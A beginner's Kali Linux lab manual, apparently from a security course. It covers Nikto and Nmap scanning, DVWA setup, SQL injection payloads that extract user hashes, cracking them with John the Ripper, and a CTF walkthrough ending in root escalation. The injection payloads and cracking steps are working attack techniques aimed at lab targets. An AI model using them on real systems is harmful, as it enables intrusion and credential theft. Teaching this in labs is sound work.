# Lab Manual – Step-by-Step Beginner Guide

> **Environment:** Kali Linux | All commands run in Terminal unless stated otherwise.  
> **Tip:** Wherever you see `#` at the start of a command, you are running as **root**. Use `sudo su` to become root, or prefix commands with `sudo`.

---

## Program 1 – Nikto Web Vulnerability Scanner on DVWA

### What is this?
Nikto is a tool that scans a web server and reports security vulnerabilities, misconfigurations, and interesting files. Here we scan DVWA (Damn Vulnerable Web Application) running locally.

### Pre-requirement
DVWA must already be running on your machine at `http://127.0.0.1/DVWA`.  
*(If it is not set up yet, complete Program 3 & 4 first, then come back.)*

---

### Steps

**Step 1 – Open a Terminal**
Click the terminal icon on your Kali taskbar, or press `Ctrl + Alt + T`.

**Step 2 – Switch to root**
```bash
sudo su -
```
Enter your Kali password when prompted.

**Step 3 – Confirm Nikto is installed**
```bash
nikto -Version
```
You should see something like `Nikto v2.5.0`. If not, install it:
```bash
apt install nikto -y
```

**Step 4 – Run Nikto against DVWA**
```bash
nikto -h http://127.0.0.1/DVWA
```
- `-h` means **host** (the target URL).

**Step 5 – Wait for the scan to finish**
The scan takes about 30–60 seconds. You will see lines scrolling showing findings like:
- Missing security headers (X-Frame-Options, Content-Type)
- Allowed HTTP methods (GET, POST, OPTIONS, HEAD)
- Interesting directories: `/DVWA/config/`, `/DVWA/tests/`, `/DVWA/database/`
- Admin login page found at `/DVWA/login.php`
- PHP backdoor file manager paths
- Git config/index files found
- A backdoor identified at `/DVWA/shell%Cat`

**Step 6 – Read the summary**
At the end you will see:
```
+ 1 host(s) tested
```
Along with a note about Apache version and a suggestion to update Nikto's database.

---

### Expected Output (key lines)
```
- Target IP:       127.0.0.1
- Target Hostname: 127.0.0.1
- Target Port:     80
- Nikto v2.5.0
+ Server: Apache/2.4.63 (Debian)
+ /DVWA/config/: Directory indexing found.
+ /DVWA/login.php: Admin login page/section found.
+ /DVWA/shell%Cat/etc/hosts: A backdoor was identified.
+ 1 host(s) tested
```

---

### Troubleshooting
| Problem | Fix |
|---|---|
| `Connection refused` | DVWA/Apache is not running. Run `service apache2 start` first. |
| `nikto: command not found` | Run `apt install nikto -y` |
| Scan hangs | Press `Ctrl+C` to stop; try adding `-timeout 10` to the command |

---

## Program 2 – Nmap Port Scan + DNS Enumeration

### What is this?
- **Nmap** scans a host to find open ports and services.
- **DNS enumeration** traces how a domain resolves through CNAME/A records.

---

### Part A – Nmap Scan

**Step 1 – Open Terminal and become root**
```bash
sudo su -
```

**Step 2 – Run an Nmap scan on a target IP**
```bash
nmap -sV 192.168.1.1
```
- `-sV` detects service versions on open ports.

**Step 3 – Read the output**

Expected output:
```
PORT      STATE     SERVICE   VERSION
23/tcp    filtered  telnet
53/tcp    open      domain    Unbound
80/tcp    open      http
443/tcp   open      ssl/https
```

**Step 4 (Optional) – Aggressive scan for more detail**
```bash
nmap -p- -A 192.168.1.1
```
- `-p-` scans ALL 65535 ports.
- `-A` enables OS detection, version detection, script scanning, and traceroute.

---

### Part B – DNS Enumeration (nslookup / host)

**Step 1 – Look up a domain's DNS chain**
```bash
host learn.microsoft.com
```
or
```bash
nslookup learn.microsoft.com
```

**Step 2 – Read the CNAME chain in output**

Expected output pattern:
```
learn.microsoft.com → cname_record → learn-public.trafficmanager.net
microsoft.com       → node         → fpt.dfp.microsoft.com
```

**Step 3 – Look up an A record (IP address)**
```bash
host tide42.microsoft.com
```
Expected:
```
tide42.microsoft.com → a_record → 207.46.238.142
```

---

### Part C – Open DVWA in Browser

**Step 1 – Open Firefox in Kali**

**Step 2 – Type in the address bar:**
```
127.0.0.1/DVWA
```

**Step 3 – You should see the DVWA login/welcome page.**
This confirms DVWA is accessible and running.

---

## Program 3 – Setting Up DVWA (One-time Setup)

### What is this?
DVWA (Damn Vulnerable Web Application) is an intentionally insecure PHP/MySQL web app used for practising attacks legally on your own machine.

---

### Steps

**Step 1 – Open Terminal and become root**
```bash
sudo su -
```

**Step 2 – Clone DVWA from GitHub**
```bash
git clone https://github.com/digininja/DVWA.git
```
Wait for it to download (~2.49 MiB).

**Step 3 – Move DVWA to the web server folder**
```bash
mv DVWA /var/www/html
```

**Step 4 – Go to the web folder and confirm**
```bash
cd /var/www/html
ls
```
You should see: `DVWA  index.html  index.nginx-debian.html`

**Step 5 – Start Apache web server**
```bash
service apache2 start
```

**Step 6 – Enter the DVWA directory and copy the config file**
```bash
cd DVWA
cp config/config.inc.php.dist config/config.inc.php
```

**Step 7 – Start MariaDB (MySQL)**
```bash
service mariadb start
```
> If you see `Failed to start meriadb.service: Unit meriadb.service not found` — note the typo. The correct command is `mariadb` not `meriadb`. Run:
```bash
service mariadb start
```

---

## Program 4 – Configure DVWA Database in MariaDB

### What is this?
We create the database and user that DVWA needs to function.

---

### Steps

**Step 1 – Open the MariaDB shell**
```bash
mysql
```
You will see the `MariaDB [(none)]>` prompt.

**Step 2 – Create the DVWA database**
```sql
create database dvwa;
```
Output: `Query OK, 1 row affected`

**Step 3 – Create a database user**
```sql
create user dvwa@localhost identified by 'p@ssw0rd';
```
Output: `Query OK, 0 rows affected`

**Step 4 – Grant the user full access to the dvwa database**
```sql
grant all on dvwa.* to dvwa@localhost;
```
Output: `Query OK, 0 rows affected`

**Step 5 – Apply the changes**
```sql
flush privileges;
```
Output: `Query OK, 0 rows affected`

**Step 6 – Exit MariaDB**
```sql
exit
```

**Step 7 – Open Firefox and go to DVWA setup page**
```
http://localhost/DVWA/setup.php
```

**Step 8 – Scroll down and click "Create / Reset Database"**

You should see the Setup Check page showing:
- Operating system: *nix ✓
- DVWA version info
- reCAPTCHA key: **Missing** (normal, ignore for now)
- Writable folder: **No** — fix this with:
```bash
chmod 777 /var/www/html/DVWA/hackable/uploads/
```
Then refresh the page and click the button again.

**Step 9 – DVWA is ready. Log in at:**
```
http://localhost/DVWA/login.php
```
Default credentials: `admin` / `password`

---

## Program 5 – SQL Injection on DVWA

### What is this?
SQL Injection is a technique where you insert malicious SQL code into an input field to manipulate the database. Here we extract usernames and password hashes.

---

### Steps

**Step 1 – Log into DVWA**
Go to `http://127.0.0.1/DVWA/login.php`  
Login: `admin` / `password`

**Step 2 – Set Security Level to Low**
- Click **DVWA Security** in the left menu.
- Set the security level to **Low**.
- Click **Submit**.

**Step 3 – Click "SQL Injection" in the left menu**

**Step 4 – In the "User ID" box, type this payload and click Submit:**
```
' or 1=1 union select null, version() #
```
This tests if the field is injectable and returns the DB version.

**Step 5 – Extract all usernames and passwords with this payload:**
```
' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```

**Step 6 – Read the output**

You will see entries like:
```
First name: admin
Surname: admin
admin
5f4dcc3b5aa765d61d8327deb882cf99

First name: Gordon
Surname: Brown
gordonb
e99a18c428cb38d5f260853678922e03
```
These are MD5 password hashes.

---

## Program 6 – Password Hash Cracking with John the Ripper

### What is this?
John the Ripper cracks hashed passwords using wordlists. We crack the MD5 hashes obtained from the SQL injection above.

---

### Steps

**Step 1 – Create a file with the hashes**
```bash
nano hashes.txt
```
Paste the hashes in `username:hash` format:
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```
Press `Ctrl+O` to save, `Ctrl+X` to exit.

**Step 2 – Check John the Ripper's wordlists location**
```bash
ls /usr/share/john/
```
You will see many files. The main wordlist for cracking is usually at:
```bash
ls /usr/share/wordlists/
```

**Step 3 – Run John with the rockyou wordlist**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```
> If rockyou.txt is compressed, unzip it first:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Step 4 – View cracked passwords**
```bash
john --show --format=raw-md5 hashes.txt
```

Expected results:
```
admin:password
gordonb:abc123
1337:charley
pablo:letmein
smithy:password
```

---

## Program 7 – Network Discovery + Nmap + CTF Flag

### What is this?
We use `netdiscover` to find live hosts on the network, then Nmap to scan a specific target, and then find hidden files (CTF flags) on that target.

---

### Steps

**Step 1 – Run netdiscover to find hosts on the network**
```bash
netdiscover -r 192.168.20.0/16
```
Wait for it to capture ARP packets. You will see a table like:
```
IP              MAC Address    Vendor
192.168.1.1     ...            TP-LINK
192.168.1.104   ...            PCS Systemtechnik GmbH   ← Target
192.168.1.100   ...            OnePlus Technology
```
Note the target IP (e.g., `192.168.1.104`). Press `Ctrl+C` to stop.

**Step 2 – Run a full Nmap scan on the target**
```bash
nmap -p- -A 192.168.1.104
```
Expected output:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

**Step 3 – Open the target's web server in Firefox**
```
http://192.168.1.104
```
You should see the Apache2 Ubuntu Default Page.

**Step 4 – Check for a notes file**
In the browser address bar, type:
```
http://192.168.1.104/notes.txt
```
You will find notes like:
```
1- i should finish my second lab
2- i should delete the remb.txt file and remb2.txt
```

**Step 5 – Get the first flag**
```
http://192.168.1.104/remb.txt
```
Output:
```
first_stage:flagitifyoucan1234
```
**Flag found!** 🎉

---

## Program 8 – Steganography + Privilege Escalation + ZAP Intro

### Part A – Steghide (Extract Hidden Data from Image)

**Step 1 – Make sure steghide is installed**
```bash
apt install steghide -y
```

**Step 2 – Extract hidden data from an image**
(The image used in the lab is called `spinning the wool.jpeg`)
```bash
steghide extract -sf "spinning the wool.jpeg"
```

**Step 3 – Enter the passphrase when prompted**
(From the lab context, the passphrase found in the previous step is `flagitifyoucan1234`)

**Step 4 – Read the extracted file**
```bash
cat remb2.txt
```
Output:
```
ooh, i know should delete this, but i cant' remember it
screw me
mhz_c1f:1@ec1f
```
You found credentials: **username:** `mhz_c1f` | **password:** `1@ec1f`

---

### Part B – Privilege Escalation to Root

**Step 1 – Switch to the discovered user**
```bash
su mhz_c1f
```
Enter password: `1@ec1f`

**Step 2 – Check your groups/privileges**
```bash
id
```
Output shows the user is in the **sudo** group:
```
uid=1000(mhz_c1f) gid=1000(mhz_c1f) groups=1000(mhz_c1f),4(adm),24(cdrom),27(sudo)
```

**Step 3 – Escalate to root using sudo**
```bash
sudo su
```
Enter the password `1@ec1f` when prompted.

**Step 4 – Navigate to root's home directory**
```bash
cd /root
ls -la
```
You will see `.root.txt` in the listing.

**Step 5 – Read the root flag**
```bash
cat .root.txt
```
Output:
```
OwO HACKER MAN :D

Well done sir, you have successfully got the root flag.
I hope you enjoyed in this mission.

#mhz_cyber
```
**Root flag captured!** 🏆

---

### Part C – Introduction to ZAP (OWASP Zed Attack Proxy)

**Step 1 – Launch ZAP**
```bash
zaproxy
```
Or find it in: Kali Menu → Web Application Analysis → zaproxy

**Step 2 – On the Welcome screen, choose one of:**
- **Automated Scan** – enter a URL and ZAP scans it automatically.
- **Manual Explore** – opens a browser through ZAP's proxy so you can browse and ZAP records traffic.
- **Learn More** – documentation.

**Step 3 – For a quick automated scan:**
- Click **Automated Scan**
- Enter: `http://127.0.0.1/DVWA`
- Click **Attack**
- Wait for results in the Alerts tab at the bottom.

> ZAP 2.16.1 or newer may show an update notification — you can dismiss it.

---

## Quick Reference – All Commands

| Program | Key Command |
|---|---|
| Nikto scan | `nikto -h http://127.0.0.1/DVWA` |
| Nmap version scan | `nmap -sV <IP>` |
| Nmap full scan | `nmap -p- -A <IP>` |
| DNS lookup | `host <domain>` |
| Clone DVWA | `git clone https://github.com/digininja/DVWA.git` |
| Start Apache | `service apache2 start` |
| Start MariaDB | `service mariadb start` |
| Open MySQL shell | `mysql` |
| John the Ripper | `john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt` |
| Netdiscover | `netdiscover -r 192.168.20.0/16` |
| Steghide extract | `steghide extract -sf "image.jpeg"` |
| Launch ZAP | `zaproxy` |
